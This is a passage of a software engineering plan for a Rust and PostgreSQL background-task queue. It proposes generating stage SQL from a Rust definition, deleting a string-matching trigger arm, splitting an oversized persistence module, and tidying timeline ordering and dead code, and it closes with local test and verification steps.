- **Pure:** `QuorumTimeoutAction::from_str` round-trip, including the unknown-action error.

### Done when

- [ ] Resuming a dead-lettered task actually gets a fresh retry budget; a continuation does not.
- [ ] The trigger has an explicit `failed`/`dead_letter` → `pending` arm.
- [ ] The `ELSE` fallback records `unknown`, and `reason = 'unknown'` is empty after a full test run.
- [ ] Approval actions are parsed into an enum; no `_ =>` guess remains.
- [ ] `reject` records `approval_rejected` with `actor_kind = 'approval'`.

---

## Phase 6 — One source of truth for stage and lease-lost

### Goal

Two rules are written twice, in two languages, with nothing that fails a release build when they
drift.

### The defects

**(a) Stage derivation exists in SQL and in Rust.** The production decision is the `CASE` in the
`staged` CTE (`src/adapters/persistence/task.rs`, inside `list_task_chain_board`).
`ChainStage::derive` (`src/domain/entities/task.rs:729`) is a Rust re-implementation used only by
`debug_assert_eq!` (`task.rs:353`) and by the three new unit tests
(`every_individual_chain_state_maps_to_its_operational_stage`,
`chain_stage_precedence_surfaces_mixed_work_and_delivery_failures`,
`completed_chains_require_every_task_and_delivery_to_succeed`).

In release builds nothing checks them against each other. The three tests read like coverage of
board staging and cover the copy production never runs.

**(b) The lease-lost error string is duplicated into the trigger.**
`const LEASE_EXPIRED_ERROR` (`task.rs:72`) is matched by literal text in the trigger:

```sql
WHEN OLD.status = 'processing' AND NEW.status = 'pending'
     AND NEW.last_error = 'Task lease expired without the run reporting a result'
    THEN 'lease_lost'
```

Editing the Rust constant silently reclassifies every future lease loss as `retryable_failure`.

### Files touched

- `src/domain/entities/task.rs`
- `src/adapters/persistence/task.rs`
- `migrations/20260817000000_init_schema.sql`

### Design

**(a) Generate the SQL from the Rust definition.**

The SQL genuinely needs `stage` as a column — `PARTITION BY stage` drives both the per-column
`ROW_NUMBER()` limit and the `stage_total` count — so it cannot move wholesale into Rust. Make the
Rust definition the source and emit the SQL from it:

```rust
impl ChainStage {
    /// The board's precedence, as one pure decision. [`Self::SQL_CASE`] is the same ladder for the
    /// window functions that need `stage` as a column; the two are checked against each other by
    /// `chain_stage_sql_matches_rust_derivation`.
    pub fn derive(counts: &TaskChainCounts) -> Self { … }

    /// Must stay rung-for-rung identical to [`Self::derive`].
    pub const SQL_CASE: &'static str = r#"CASE
        WHEN failed > 0 OR dead_letter > 0 OR stopped > 0
             OR expired_processing > 0 OR delivery_failed > 0 THEN 'needs_attention'
        WHEN pending_approval > 0 THEN 'waiting_approval'
        WHEN processing > 0 OR delivery_sending > 0 THEN 'running'
        WHEN waiting_reply > 0 THEN 'waiting_reply'
        WHEN pending > 0 OR delivery_pending > 0 THEN 'queued'
        WHEN total_tasks > 0 AND completed = total_tasks
             AND delivery_sent = total_deliveries THEN 'completed'
        ELSE 'needs_attention'
    END"#;
}
```

and interpolate `{case}` into the board query via `format!`. One edit site, and the two now sit
adjacent so a change to one is visibly a change to the other.

**Back it with a real test, not a `debug_assert`.** Add a DB-backed test that pushes a matrix of
`TaskChainCounts` through the actual SQL and compares against `derive`:

```rust
#[tokio::test]
async fn chain_stage_sql_matches_rust_derivation() {
    let Some(pool) = test_pool().await else { return };
    for counts in stage_matrix() {          // every count field at 0 and 1, plus the mixed cases
        let sql: String = sqlx::query_scalar(&format!(
            "SELECT {} FROM (SELECT $1::bigint AS failed, …) AS combined",
            ChainStage::SQL_CASE
        )).bind(…).fetch_one(&pool).await.unwrap();
        assert_eq!(ChainStage::from_str(&sql).unwrap(), ChainStage::derive(&counts),
                   "SQL and Rust disagree for {counts:?}");
    }
}
```

This is the test the three existing pure ones were standing in for. Keep them — they document
intent — but this is the one that catches drift.

Then remove `debug_assert_eq!` at `task.rs:353`, or promote it to a real error. Prefer removal:
with the matrix test in place the assert is redundant, and a `debug_assert` on a value read from
the database is a panic waiting for production data the test matrix did not anticipate.

**(b) Delete the lease-lost string match rather than syncing it.**

The reason the trigger sniffs `last_error` is that the lease sweep is a *set-based* UPDATE over
many tasks in one statement (`task.rs:1702`) and never calls `set_task_transition_context`. But
every row that statement touches is lease-lost by definition, so a single transaction-local setting
covers the whole batch:

```rust
set_task_transition(&mut tx, TaskTransitionReason::LeaseLost, TransitionActor::System).await?;
// … the existing set-based UPDATE, unchanged …
```

The trigger's own fallback then fills in the per-row actor correctly:

```sql
IF transition_actor_id IS NULL AND transition_actor_kind = 'worker' THEN
    transition_actor_id := COALESCE(NEW.worker_id, CASE WHEN TG_OP = 'UPDATE' THEN OLD.worker_id END);
```

so each reaped row still attributes to the worker that lost it — which is more accurate than a
single sweep-wide actor. (Set `actor_kind` to `worker` for this, not `system`, so that fallback
engages.)

With that in place, **delete both `NEW.last_error = '…'` arms from the trigger.** The duplication
is gone rather than synchronised.

### Tests

- `chain_stage_sql_matches_rust_derivation` as above — the centrepiece.
- DB-backed: force a lease expiry, run `reap_expired_task_leases`, assert the resulting event has
  `reason = 'lease_lost'` and `actor_id` equal to the worker that held the lease. This is what
  proves the trigger arms are safe to delete.

### Done when

- [ ] The stage ladder is written once; the SQL is generated from it.
- [ ] A DB-backed matrix test compares SQL against Rust; `debug_assert_eq!` removed.
- [ ] The lease sweep sets its own transition reason.
- [ ] Both `last_error` string-matching arms are gone from the trigger.
- [ ] `LEASE_EXPIRED_ERROR` appears only in Rust.

---

## Phase 7 — Structural cleanup

### Goal

Pay down what this commit added on top of existing `AGENTS.md` debt. Do this **last** — Phases 3–6
move a lot of this code, and splitting first means resolving the same changes twice.

### Files touched

- `src/adapters/persistence/task.rs` → `src/adapters/persistence/task/`
- `src/adapters/http/pages/task_board.rs`
- `src/domain/entities/task.rs`
- `src/adapters/http/routes/ui_tasks.rs`

### Items

**(a) Split `persistence/task.rs` — 5,692 lines (this commit added 1,474).**

`AGENTS.md` says split at ~1,000, and move an inline test module past ~500 lines to a sibling.
Proposed decomposition along the phase boundaries already in the file:

| File | Contents |
|------|----------|
| `task/mod.rs` | the `TaskPersistence` trait, shared `*Db` structs and their `TryFrom` impls, `OUTBOX_COLUMNS`, shared consts |
| `task/queue.rs` | enqueue, claim, lease renewal/expiry sweep, complete, `mark_task_failed`, stop/resume |
| `task/board.rs` | `list_task_chain_board`, `get_task_chain_detail`, `list_task_status_events`, the transition-context setters |
| `task/outreach.rs` | outreach start/response/timeout/extend |
| `task/attempts.rs` | attempt ledger reads and writes |

with `#[cfg(test)] #[path = "board_tests.rs"] mod tests;` per file. Move the mocks that get
re-declared across the 6 implementor sites into one shared `test_support` module while here.

Do this as a **pure move** — no logic changes in the same commit — so the diff is reviewable.

**(b) Name the timeline tuple.** `src/adapters/http/pages/task_board.rs:302`:

```rust
let mut entries: Vec<(DateTime<Utc>, Uuid, i32, String)> = Vec::new();
```

Four elements, and the sort keys are magic (`10_000` attempts, `20_000` deliveries, `30_000`
approvals, `40_000` outreaches) chosen to sit above real `task_status_events.sequence` values.
Replace with:

```rust
/// One row of the merged chain timeline. `kind` orders entries that share a task and timestamp,
/// and keeps synthetic rows clear of the real `task_status_events.sequence` space.
struct TimelineEntry {
    at: DateTime<Utc>,
    task_id: Uuid,
    kind: TimelineKind,
    sequence: i32,
    html: String,
}

#[derive(PartialEq, Eq, PartialOrd, Ord)]
enum TimelineKind { StatusEvent, Attempt, Delivery, Approval, Outreach }
```

Sorting by `(at, task_id, kind, sequence)` derives the ordering from the enum's declaration order
instead of from magic offsets, and removes the "what happens past 10,000 events" question. It also
fixes the current instability where every delivery for a task gets the identical key `20_000`.

**(c) Dead code.** `TaskBoardFilter::with_limit` and `MAX_PER_COLUMN`
(`src/domain/entities/task.rs:843`) are never called — `board_filter()` always takes the default 50,
and no query parameter reaches them. Either wire a `per_column` param through `TasksQuery` (the
clamp is already written and correct) or delete both. Deleting is the honest default; add it back
when a caller exists.

**(d) Round trips on the failure path.** `mark_task_failed` went from one statement on the pool to
`BEGIN` + `set_config` + `UPDATE` + `COMMIT` — four round trips on **every** task failure and
retry, the hottest write in the queue.

Two options:

- **Option A (small):** accept it. Correctness first, and the queue is not currently round-trip
  bound. Measure before optimising.
- **Option B (better, if the schema is open anyway):** replace the transaction-local GUC mechanism
  with a `transition_reason` / `transition_actor_kind` / `transition_actor_id` triple of nullable
  columns on `background_tasks`, set by the same `UPDATE` that changes `status`, and read by the
  trigger from `NEW.*` instead of `current_setting()`. That removes the extra round trip, removes
  the GUC-leak class of bug entirely (Phase 4 mitigates it; this eliminates it), and makes the
  intended reason visible in the row rather than in invisible session state.

  Cost: three columns on a hot table, and every status-changing `UPDATE` must set them (which is
  the point — forgetting becomes visible in the ledger as `unknown` from Phase 5). The set-based
  lease sweep works naturally under this scheme too.

  Recommended given the DB is pre-release and reset-on-change, but it is a real redesign — do not
  fold it into another phase.

**(e) Reduce trigger chatter.** If not already done in Phase 3: add
`WHEN (TG_OP = 'INSERT' OR OLD.status IS DISTINCT FROM NEW.status)` to `email_outbox_notify_chain`
and `human_approvals_notify_chain` so no-op status writes stop waking every connected board.

### Done when

- [ ] No file touched by this work exceeds ~1,000 lines; no inline test module exceeds ~500.
- [ ] `chain_timeline` uses a named struct and an ordering enum; no magic offsets.
- [ ] `with_limit`/`MAX_PER_COLUMN` either wired to a query parameter or deleted.
- [ ] A decision recorded on Option A vs B for the transition-context mechanism.
- [ ] Notify triggers fire only on real status changes.

---

## End-to-end verification

After every phase:

```sh
dropdb --if-exists mail_agents && createdb mail_agents
dropdb --if-exists mail_agents_test && createdb mail_agents_test
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx migrate run
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx prepare -- --all-targets

cargo build
cargo clippy --all-targets -- -D warnings
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents_test" cargo test --lib
cargo fmt
```

Manual pass on the board once Phase 3 lands (server on `:3001`):

1. Create a channel named `<b>bold</b>`; confirm the board card shows the literal text, not markup.
2. Open `/ui/tasks?view=board` in two browser windows; run a task in an *unrelated* chain; confirm
   only the board column counts move and the selected pane does **not** flicker or re-render.
3. Select a chain, drive it through approval and outreach; confirm the timeline reasons read
   `approval_requested` / `approval_accepted` / `outreach_started`, never `retryable_failure`.
4. Dead-letter a task, hit Resume, confirm it runs again and survives one more failure.
5. `SELECT reason, count(*) FROM task_status_events GROUP BY 1` — no `unknown` rows.

### Ledger health query

Worth keeping as an operational check after the whole plan lands:

```sql
SELECT to_status, reason, actor_kind, count(*)
  FROM task_status_events
 WHERE transitioned_at > now() - interval '1 day'
 GROUP BY 1, 2, 3
 ORDER BY 4 DESC;
```

Rows with `reason = 'unknown'`, or an actor_kind that contradicts its reason
(`operator_stopped` + `approval`), mean a call site is still transitioning a task without saying
why.
